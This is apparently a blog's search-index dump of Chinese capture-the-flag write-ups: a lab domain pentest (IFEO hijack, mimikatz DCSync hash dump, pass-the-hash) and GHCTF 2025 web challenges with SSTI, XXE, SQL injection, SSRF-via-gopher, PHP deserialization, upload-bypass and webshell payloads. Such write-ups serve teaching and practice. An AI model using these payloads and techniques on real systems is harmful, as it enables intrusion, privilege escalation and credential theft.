将数据采集完生成的zip文件，上传导入到BloodHound分析\n从图中，我们会发现46这台机子的用户是域管，那我们接下来就要想办法在这台机子上提权，然后拿下域控\n根据前面的hint\nDo you know how to hijack Image? 我们可以知道接下来要进行镜像劫持(IFEO)提权\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl 这条命令的意思是获取指定注册表路径的访问控制列表（ACL）。\nNT AUTHORITY\\Authenticated Users 我们可以发现全部已登录用户都可以对注册表进行修改\n那我们就可以通过修改注册表进行映像劫持\n我们这里通过将放大镜启动的magnify.exe替换成C:\\windows\\system32\\cmd.exe，来进行提权\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; 修改后选择锁定\n在锁定页面选择放大镜即可\ntype c:\\Users\\Administrator\\flag\\flag02.txt 接着我们可以新建一个用户让rdp可以连上去\nFLAG3 接下来就是常规的将域内用户的哈希dump下来\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt 结果\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! 之后就可以进行横向移动了\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt 拿到最后一个flag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} 这题用cs打会方便很多，但是一开始没考虑到，所以后面也一直没用。\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\u003c/p\u003e","title":"春秋云镜-Tsclient-Writeup"},{"content":"战队名：我要打奥斯汀major\n比赛排名：5\nWeb upload?SSTI! 读取文件中的内容并进行模板渲染，存在ssti\n有waf\n1def contains_dangerous_keywords(file_path): 2 dangerous_keywords = [\u0026#39;_\u0026#39;, \u0026#39;os\u0026#39;, \u0026#39;subclasses\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;__globals__\u0026#39;,\u0026#39;flag\u0026#39;,] 3 4 with open(file_path, \u0026#39;rb\u0026#39;) as f: 5 file_content = str(f.read()) 6 7 for keyword in dangerous_keywords: 8 if keyword in file_content: 9 return True # 找到危险关键字，返回 True 简单绕一下\npayload:\n1{{\u0026#34;\u0026#34;[\u0026#39;\\x5f\\x5fclass\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fbase\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fsubcl\u0026#39;+\u0026#39;asses\\x5f\\x5f\u0026#39;]()[139][\u0026#39;\\x5f\\x5finit\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fglo\u0026#39;+\u0026#39;bals\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fbui\u0026#39;+\u0026#39;ltins\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;](\u0026#39;OS\u0026#39;.lower()).popen(\u0026#39;cat /f*\u0026#39;).read()}} 随便传个txt就行\n(\u0026gt;﹏\u0026lt;) 题目\n1from flask import Flask,request import base64 from lxml import etree import re app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def index(): return open(__file__).read() @app.route(\u0026#39;/ghctf\u0026#39;,methods=[\u0026#39;POST\u0026#39;]) def parse(): xml=request.form.get(\u0026#39;xml\u0026#39;) print(xml) if xml is None: return \u0026#34;No System is Safe.\u0026#34; parser = etree.XMLParser(load_dtd=True, resolve_entities=True) root = etree.fromstring(xml, parser) name=root.find(\u0026#39;name\u0026#39;).text return name or None if __name__==\u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=8080) 是个xxe\n直接读flag\n1curl -X POST http://node2.anna.nssctf.cn:28535/ghctf --data-urlencode \u0026#39;\u0026lt;!DOCTYPE data [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt; ]\u0026gt;\u0026lt;root\u0026gt;\u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt;\u0026lt;/root\u0026gt;\u0026#39; SQL??? 1url/?id=1 union select 1,2,3,4,sqlite_version() 发现是Sqlite\n接着查表就行了\n1url/?id=1 union select 1,2,3,4,sql from sqlite_master 1?id=1 union select 1,2,3,4,select flag from flag 2//直接从flag表中查flag列就行 Popppppp 题目\n1\u0026lt;?php 2error_reporting(0); 3 4class CherryBlossom { 5 public $fruit1; 6 public $fruit2; 7 8 public function __construct($a) { 9 $this-\u0026gt;fruit1 = $a; 10 } 11 12 function __destruct() { 13 echo $this-\u0026gt;fruit1; 14 } 15 16 public function __toString() { 17 $newFunc = $this-\u0026gt;fruit2; 18 return $newFunc(); 19 } 20} 21 22class Forbidden { 23 private $fruit3; 24 25 public function __construct($string) { 26 $this-\u0026gt;fruit3 = $string; 27 } 28 29 public function __get($name) { 30 $var = $this-\u0026gt;$name; 31 $var[$name](); 32 } 33} 34 35class Warlord { 36 public $fruit4; 37 public $fruit5; 38 public $arg1; 39 40 public function __call($arg1, $arg2) { 41 $function = $this-\u0026gt;fruit4; 42 return $function(); 43 } 44 45 public function __get($arg1) { 46 $this-\u0026gt;fruit5-\u0026gt;ll2(\u0026#39;b2\u0026#39;); 47 } 48} 49 50class Samurai { 51 public $fruit6; 52 public $fruit7; 53 54 public function __toString() { 55 $long = @$this-\u0026gt;fruit6-\u0026gt;add(); 56 return $long; 57 } 58 59 public function __set($arg1, $arg2) { 60 if ($this-\u0026gt;fruit7-\u0026gt;tt2) { 61 echo \u0026#34;xxx are the best!!!\u0026#34;; 62 } 63 } 64} 65 66class Mystery { 67 68 public function __get($arg1) { 69 array_walk($this, function ($day1, $day2) { 70 $day3 = new $day2($day1); 71 foreach ($day3 as $day4) { 72 echo ($day4 . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;); 73 } 74 }); 75 } 76} 77 78class Princess { 79 protected $fruit9; 80 81 protected function addMe() { 82 return \u0026#34;The time spent with xxx is my happiest time\u0026#34; . $this-\u0026gt;fruit9; 83 } 84 85 public function __call($func, $args) { 86 call_user_func([$this, $func . \u0026#34;Me\u0026#34;], $args); 87 } 88} 89 90class Philosopher { 91 public $fruit10; 92 public $fruit11=\u0026#34;sr22kaDugamdwTPhG5zU\u0026#34;; 93 94 public function __invoke() { 95 if (md5(md5($this-\u0026gt;fruit11)) == 666) { 96 return $this-\u0026gt;fruit10-\u0026gt;hey; 97 } 98 } 99} 100 101class UselessTwo { 102 public $hiddenVar = \u0026#34;123123\u0026#34;; 103 104 public function __construct($value) { 105 $this-\u0026gt;hiddenVar = $value; 106 } 107 108 public function __toString() { 109 return $this-\u0026gt;hiddenVar; 110 } 111} 112 113class Warrior { 114 public $fruit12; 115 private $fruit13; 116 117 public function __set($name, $value) { 118 $this-\u0026gt;$name = $value; 119 if ($this-\u0026gt;fruit13 == \u0026#34;xxx\u0026#34;) { 120 strtolower($this-\u0026gt;fruit12); 121 } 122 } 123} 124 125class UselessThree { 126 public $dummyVar; 127 128 public function __call($name, $args) { 129 return $name; 130 } 131} 132 133class UselessFour { 134 public $lalala; 135 136 public function __destruct() { 137 echo \u0026#34;Hehe\u0026#34;; 138 } 139} 140 141if (isset($_GET[\u0026#39;GHCTF\u0026#39;])) { 142 unserialize($_GET[\u0026#39;GHCTF\u0026#39;]); 143} else { 144 highlight_file(__FILE__); 145} 146 147?\u0026gt; 跟去年ghctf的题目几乎一样\nhttps://blog.csdn.net/liaochonxiang/article/details/140361138\n走到Mystery类之后利用原生类读文件\nPOC\n1import hashlib 2import itertools 3import string 4 5for i in itertools.product(string.printable, repeat=3): 6 s = \u0026#39;\u0026#39;.join(i) 7 s1 = hashlib.md5(s.encode()).hexdigest() 8 s2 = hashlib.md5(s1.encode()).hexdigest() 9 if s2[:3] == \u0026#39;666\u0026#39;: 10 print(s) 11\u0026lt;?php 12class CherryBlossom{ 13 public $fruit1; 14 public $fruit2; 15} 16class Philosopher { 17 public $fruit10; 18 public $fruit11; 19} 20class Mystery{ 21 public $mystery; 22} 23$s = new CherryBlossom; 24$s-\u0026gt;fruit1 = new CherryBlossom; 25$s-\u0026gt;fruit1-\u0026gt;fruit2 = new Philosopher; 26$s-\u0026gt;fruit1-\u0026gt;fruit2-\u0026gt;fruit11 = \u0026#39;Okg\u0026#39;; 27$s-\u0026gt;fruit1-\u0026gt;fruit2-\u0026gt;fruit10 = new Mystery; 28 29# $s-\u0026gt;fruit1-\u0026gt;fruit2-\u0026gt;fruit10-\u0026gt;FilesystemIterator=\u0026#39;/\u0026#39;; 30$s-\u0026gt;fruit1-\u0026gt;fruit2-\u0026gt;fruit10-\u0026gt;SplFileObject=\u0026#39;/flag44545615441084\u0026#39;; 31 32echo serialize($s); 33?\u0026gt; ez_readfile 题目\n1\u0026lt;?php 2 show_source(__FILE__); 3 if (md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) { 4 if ($_POST[\u0026#39;a\u0026#39;] != $_POST[\u0026#39;b\u0026#39;]) { 5 if (is_string($_POST[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; is_string($_POST[\u0026#39;b\u0026#39;])) { 6 echo file_get_contents($_GET[\u0026#39;file\u0026#39;]); 7 } 8 } 9 } 10?\u0026gt; md5强碰撞，我随便找了一对\n1M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 2 3与 4 5M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 接下来的文件包含因为不知道flag名没办法直接读，很自然就能想到cnext\nhttps://github.com/kezibei/php-filter-iconv\n我用的这个工具打，感觉比原版好用\n利用任意文件读取读maps和libc二进制文件，libc的路径在maps里面有\n拿到文件之后直接生成payload打就行了\nezzzz_pickle 弱口令登录\nadmin/admin123\n登进去之后发现有个任意文件读取\n我这里直接打的非预期\n直接读环境变量 /proc/1/environ，就能拿到flag\n预期解应该是读源码然后读环境变量拿key和iv打pickle的\nPayload:\n1POST filename=/proc/1/environ Goph3rrr /app.py可以拿到源码\n1@app.route(\u0026#39;/Manage\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 2def cmd(): 3 if request.remote_addr != \u0026#34;127.0.0.1\u0026#34;: 4 return \u0026#34;Forbidden!!!\u0026#34; 5 if request.method == \u0026#34;GET\u0026#34;: 6 return \u0026#34;Allowed!!!\u0026#34; 7 if request.method == \u0026#34;POST\u0026#34;: 8 return os.popen(request.form.get(\u0026#34;cmd\u0026#34;)).read() 9 10@app.route(\u0026#39;/Gopher\u0026#39;) 11def visit(): 12 url = request.args.get(\u0026#39;url\u0026#39;) 13 if url is None: 14 return \u0026#34;No url provided :)\u0026#34; 15 url = urlparse(url) 16 realIpAddress = socket.gethostbyname(url.hostname) 17 if url.scheme == \u0026#34;file\u0026#34; or realIpAddress in BlackList: 18 return \u0026#34;No (≧∇≦)\u0026#34; 19 result = subprocess.run([\u0026#34;curl\u0026#34;, \u0026#34;-L\u0026#34;, urlunparse(url)], capture_output=True, text=True) 20 return result.stdout 主要是这两个路由，一个要本地访问，另一个可以打ssrf\n其实这题就是0xgame2024的一道ssrf，几乎没改\npayload拿来改一下直接打就行了\npayload如下\n1/Gopher?url=gopher://0.0.0.0:8000/_payload 2POST /Manage HTTP/1.1 3Host: 127.0.0.1:8000 4Content-Type: application/x-www-form-urlencoded 5Content-Length: 7 6 7cmd=env 把上面这个url编码两次之后放到payload那里\n最终payload\n1/Gopher?url=gopher://0.0.0.0:8000/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%34%64%25%36%31%25%36%65%25%36%31%25%36%37%25%36%35%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%37%25%30%61%25%30%61%25%36%33%25%36%64%25%36%34%25%33%64%25%36%35%25%36%65%25%37%36 环境变量里面有flag\nUPUPUP 文件上传，fuzz了一下，感觉php是没什么可能绕过的了\n想到打.htaccess\n但是应该有exif_imagetype()，正常来说用GIF89a绕过.htaccess会报错\n可以通过这个方法绕一下\nPayload\n1#define width 66 2#define height 66 3\u0026lt;FilesMatch \u0026#34;1.jpg\u0026#34;\u0026gt; 4 SetHandler application/x-httpd-php 5\u0026lt;/FilesMatch\u0026gt; Message in a Bottle bottle的模板注入\n这题waf掉了{}\nhttps://github.com/myzhan/bottle-doc-zh-cn/blob/master/docs/stpl.rst\n看了一下文档，发现其实不用{}\nPayload\n1\u0026lt;h\u0026gt; 2 %import os;os.system(\u0026#39;whoami\u0026#39;) 3 %end 4\u0026lt;/h\u0026gt; 题目没回显但是出网，我这里直接反弹shell读flag了\nEscape！ 漏洞点\n1$userData = checkSignedCookie(); 2if ($userData) { 3 #echo $userData; 4 $user=unserialize($userData); 5 #var_dump($user); 6 if($user-\u0026gt;isadmin){ 7 $tmp=file_get_contents(\u0026#34;tmp/admin.html\u0026#34;); 8 9 echo $tmp; 10 11 if($_POST[\u0026#39;txt\u0026#39;]) { 12 $content = \u0026#39;\u0026lt;?php exit; ?\u0026gt;\u0026#39;; 13 $content .= $_POST[\u0026#39;txt\u0026#39;]; 14 file_put_contents($_POST[\u0026#39;filename\u0026#39;], $content); 15 } 16 } 17 else{ 18 $tmp=file_get_contents(\u0026#34;tmp/admin.html\u0026#34;); 19 echo $tmp; 20 if($_POST[\u0026#39;txt\u0026#39;]||$_POST[\u0026#39;filename\u0026#39;]){ 21 echo \u0026#34;\u0026lt;h1\u0026gt;权限不足，写入失败\u0026lt;h1\u0026gt;\u0026#34;; 22} 经典的死亡杂糅绕过\n但是前提是要isadmin为1\n看到反序列化，再加上题目暗示与waf有关，自然就想到了反序列化字符串逃逸\nWaf\n1\u0026lt;?php 2 3function waf($c) 4{ 5 $lists=[\u0026#34;flag\u0026#34;,\u0026#34;\u0026#39;\u0026#34;,\u0026#34;\\\\\u0026#34;,\u0026#34;sleep\u0026#34;,\u0026#34;and\u0026#34;,\u0026#34;||\u0026#34;,\u0026#34;\u0026amp;\u0026amp;\u0026#34;,\u0026#34;select\u0026#34;,\u0026#34;union\u0026#34;]; 6 foreach($lists as $list){ 7 $c=str_replace($list,\u0026#34;error\u0026#34;,$c); 8 } 9 #echo $c; 10 return $c; 11} 我这里是先随便注册一个账号，然后拿到cookie之后解base64拿到序列化后的数据\n1function setSignedCookie($serializedData, $cookieName = \u0026#39;user_token\u0026#39;, $secretKey = \u0026#39;fake_secretKey\u0026#39;) { 2 $signature = hash_hmac(\u0026#39;sha256\u0026#39;, $serializedData, $secretKey); 3 4 $token = base64_encode($serializedData . \u0026#39;|\u0026#39; . $signature); 5 6 setcookie($cookieName, $token, time() + 3600, \u0026#34;/\u0026#34;); // 设置有效期为1小时 7} 可以看到序列化的数据是直接进行base64编码的\n构造出payload\n1username flagandandandandandandandandandand\u0026#34;;s:7:\u0026#34;isadmin\u0026#34;;b:1;} 2password 123456 //随意 逃逸21个字符\n登录之后写马就行，但是要绕一下死亡杂糅\nhttps://xz.aliyun.com/news/7758\npayload\n1php://filter/convert.base64-decode/resource=1.php 2aPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg== 3//要补一个a 4//\u0026lt;?php @eval($_POST[1]);?\u0026gt; GetShell 题目\n1\u0026lt;?php 2highlight_file(__FILE__); 3 4class ConfigLoader { 5 private $config; 6 7 public function __construct() { 8 $this-\u0026gt;config = [ 9 \u0026#39;debug\u0026#39; =\u0026gt; true, 10 \u0026#39;mode\u0026#39; =\u0026gt; \u0026#39;production\u0026#39;, 11 \u0026#39;log_level\u0026#39; =\u0026gt; \u0026#39;info\u0026#39;, 12 \u0026#39;max_input_length\u0026#39; =\u0026gt; 100, 13 \u0026#39;min_password_length\u0026#39; =\u0026gt; 8, 14 \u0026#39;allowed_actions\u0026#39; =\u0026gt; [\u0026#39;run\u0026#39;, \u0026#39;debug\u0026#39;, \u0026#39;generate\u0026#39;] 15 ]; 16 } 17 18 public function get($key) { 19 return $this-\u0026gt;config[$key] ?? null; 20 } 21} 22 23class Logger { 24 private $logLevel; 25 26 public function __construct($logLevel) { 27 $this-\u0026gt;logLevel = $logLevel; 28 } 29 30 public function log($message, $level = \u0026#39;info\u0026#39;) { 31 if ($level === $this-\u0026gt;logLevel) { 32 echo \u0026#34;[LOG] $message\\n\u0026#34;; 33 } 34 } 35} 36 37class UserManager { 38 private $users = []; 39 private $logger; 40 41 public function __construct($logger) { 42 $this-\u0026gt;logger = $logger; 43 } 44 45 public function addUser($username, $password) { 46 if (strlen($username) \u0026lt; 5) { 47 return \u0026#34;Username must be at least 5 characters\u0026#34;; 48 } 49 50 if (strlen($password) \u0026lt; 8) { 51 return \u0026#34;Password must be at least 8 characters\u0026#34;; 52 } 53 54 $this-\u0026gt;users[$username] = password_hash($password, PASSWORD_BCRYPT); 55 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;User $username added\u0026#34;); 56 return \u0026#34;User $username added\u0026#34;; 57 } 58 59 public function authenticate($username, $password) { 60 if (isset($this-\u0026gt;users[$username]) \u0026amp;\u0026amp; password_verify($password, $this-\u0026gt;users[$username])) { 61 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;User $username authenticated\u0026#34;); 62 return \u0026#34;User $username authenticated\u0026#34;; 63 } 64 return \u0026#34;Authentication failed\u0026#34;; 65 } 66} 67 68class StringUtils { 69 public static function sanitize($input) { 70 return htmlspecialchars($input, ENT_QUOTES, \u0026#39;UTF-8\u0026#39;); 71 } 72 73 public static function generateRandomString($length = 10) { 74 return substr(str_shuffle(str_repeat($x = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;, ceil($length / strlen($x)))), 1, $length); 75 } 76} 77 78class InputValidator { 79 private $maxLength; 80 81 public function __construct($maxLength) { 82 $this-\u0026gt;maxLength = $maxLength; 83 } 84 85 public function validate($input) { 86 if (strlen($input) \u0026gt; $this-\u0026gt;maxLength) { 87 return \u0026#34;Input exceeds maximum length of {$this-\u0026gt;maxLength} characters\u0026#34;; 88 } 89 return true; 90 } 91} 92 93class CommandExecutor { 94 private $logger; 95 96 public function __construct($logger) { 97 $this-\u0026gt;logger = $logger; 98 } 99 100 public function execute($input) { 101 if (strpos($input, \u0026#39; \u0026#39;) !== false) { 102 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Invalid input: space detected\u0026#34;); 103 die(\u0026#39;No spaces allowed\u0026#39;); 104 } 105 106 @exec($input, $output); 107 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Result: $input\u0026#34;); 108 return implode(\u0026#34;\\n\u0026#34;, $output); 109 } 110} 111 112class ActionHandler { 113 private $config; 114 private $logger; 115 private $executor; 116 117 public function __construct($config, $logger) { 118 $this-\u0026gt;config = $config; 119 $this-\u0026gt;logger = $logger; 120 $this-\u0026gt;executor = new CommandExecutor($logger); 121 } 122 123 public function handle($action, $input) { 124 if (!in_array($action, $this-\u0026gt;config-\u0026gt;get(\u0026#39;allowed_actions\u0026#39;))) { 125 return \u0026#34;Invalid action\u0026#34;; 126 } 127 128 if ($action === \u0026#39;run\u0026#39;) { 129 $validator = new InputValidator($this-\u0026gt;config-\u0026gt;get(\u0026#39;max_input_length\u0026#39;)); 130 $validationResult = $validator-\u0026gt;validate($input); 131 if ($validationResult !== true) { 132 return $validationResult; 133 } 134 135 return $this-\u0026gt;executor-\u0026gt;execute($input); 136 } elseif ($action === \u0026#39;debug\u0026#39;) { 137 return \u0026#34;Debug mode enabled\u0026#34;; 138 } elseif ($action === \u0026#39;generate\u0026#39;) { 139 return \u0026#34;Random string: \u0026#34; . StringUtils::generateRandomString(15); 140 } 141 142 return \u0026#34;Unknown action\u0026#34;; 143 } 144} 145 146if (isset($_REQUEST[\u0026#39;action\u0026#39;])) { 147 $config = new ConfigLoader(); 148 $logger = new Logger($config-\u0026gt;get(\u0026#39;log_level\u0026#39;)); 149 150 $actionHandler = new ActionHandler($config, $logger); 151 $input = $_REQUEST[\u0026#39;input\u0026#39;] ?? \u0026#39;\u0026#39;; 152 echo $actionHandler-\u0026gt;handle($_REQUEST[\u0026#39;action\u0026#39;], $input); 153} else { 154 $config = new ConfigLoader(); 155 $logger = new Logger($config-\u0026gt;get(\u0026#39;log_level\u0026#39;)); 156 $userManager = new UserManager($logger); 157 158 if (isset($_POST[\u0026#39;register\u0026#39;])) { 159 $username = $_POST[\u0026#39;username\u0026#39;]; 160 $password = $_POST[\u0026#39;password\u0026#39;]; 161 162 echo $userManager-\u0026gt;addUser($username, $password); 163 } 164 165 if (isset($_POST[\u0026#39;login\u0026#39;])) { 166 $username = $_POST[\u0026#39;username\u0026#39;]; 167 $password = $_POST[\u0026#39;password\u0026#39;]; 168 169 echo $userManager-\u0026gt;authenticate($username, $password); 170 } 171 172 $logger-\u0026gt;log(\u0026#34;No action provided, running default logic\u0026#34;); 173} 审计一下\n1class CommandExecutor { 2 private $logger; 3 4 public function __construct($logger) { 5 $this-\u0026gt;logger = $logger; 6 } 7 8 public function execute($input) { 9 if (strpos($input, \u0026#39; \u0026#39;) !== false) { 10 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Invalid input: space detected\u0026#34;); 11 die(\u0026#39;No spaces allowed\u0026#39;); 12 } 13 14 @exec($input, $output); 15 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Result: $input\u0026#34;); 16 return implode(\u0026#34;\\n\u0026#34;, $output); 17 } 18} 有个执行类\n当传参Action为run的时候就能走进去了\n传参input进行命令执行，waf了空格\n尝试读flag发现读不了，要提权\n尝试suid提权\n1find / -perm -u=s -type f 2\u0026gt;/dev/null 2看到有wc，而且wc可以读文件 3 4./wc --files0-from \u0026#34;/flag\u0026#34; Message in a Bottle plus bottle注入的plus版\nhint:增加了一点waf和Python语法错误检测，题目不出网\n一开始试了很久发现一直说语法错误\n后面想了想发现这个语法进行Python语法错误检测确实是会报错的\n那我们用多行注释掉不就好了，因为题目不出网，打内存马\n参考\nhttps://xz.aliyun.com/news/17049\nPayload\n1\u0026#34;\u0026#34;\u0026#34; 2% __import__(\u0026#39;sys\u0026#39;).modules[\u0026#39;__main__\u0026#39;].app.route(\u0026#34;/c\u0026#34;,\u0026#34;GET\u0026#34;,lambda :__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()) 3% end 4\u0026#34;\u0026#34;\u0026#34; 访问/c拿回显\n","permalink":"http://localhost:1313/post/ghctf_2025/","summary":"\u003cp\u003e战队名：\u003cstrong\u003e我要打奥斯汀major\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e比赛排名：5\u003c/p\u003e\n\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"uploadssti\"\u003eupload?SSTI!\u003c/h3\u003e\n\u003cp\u003e读取文件中的内容并进行模板渲染，存在ssti\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"img\" loading=\"lazy\" src=\"../assets/1742122180769-6.png\"\u003e\u003c/p\u003e\n\u003cp\u003e有waf\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003econtains_dangerous_keywords\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile_path\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e2\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003edangerous_keywords\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;_\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;os\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;subclasses\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;__builtins__\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;__globals__\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;flag\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e4\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile_path\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;rb\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 